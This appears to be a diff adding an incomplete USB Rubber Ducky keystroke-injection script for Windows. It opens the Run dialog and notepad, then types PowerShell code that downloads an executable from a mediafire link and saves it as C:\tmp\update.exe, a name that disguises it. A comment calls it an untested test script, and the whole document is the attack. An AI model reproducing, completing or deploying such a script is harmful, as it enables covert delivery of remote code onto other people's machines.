@@ -1,0 +1,13 @@
+REM *Test script. Not complete and have not run once yet on a Windows machine*
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 200
+STRING $client = new-object System.Net.WebClient
+ENTER
+STRING $client.DownloadFile("http://download1490.mediafire.com/j9iauiwh9t0g/t5lgmtgc98cakkd/clippy.exe","C:\tmp\update.exe")
+DELAY 100
+CTRL S
